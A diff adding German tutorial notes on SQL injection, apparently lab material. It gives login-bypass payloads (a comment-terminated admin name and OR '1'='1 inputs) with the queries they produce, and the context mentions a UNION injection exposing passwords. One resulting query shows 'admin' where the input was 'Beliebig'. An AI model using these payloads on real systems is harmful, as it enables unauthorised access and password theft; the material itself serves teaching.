@@ -28,3 +28,24 @@ SELECT id, username, email FROM benutzer WHERE username = '' UNION SELECT id, us
 
 ursprünglich:   id | username | email
 Injection:      id | username | passwort    <-- SQL Injection!!!
+
+
+3. Login
+Um sich als Admin einzuloggen z.B. folgendes eingeben:
+Benutzername: admin' #
+Passwort: Beliebig
+
+Daraus entsteht:
+SELECT id, username, email
+FROM benutzer
+WHERE username = 'admin' #' AND passwort = 'x'
+
+
+Um sich generell als Benutzer anzumelden:
+Benutzername: Beliebig' OR '1'='1
+Passwort: Beliebig' OR '1'='1
+
+Daraus entsteht: 
+SELECT id, username, email
+FROM benutzer
+WHERE username = 'admin' OR '1'='1' AND passwort = 'Test' OR '1'='1'
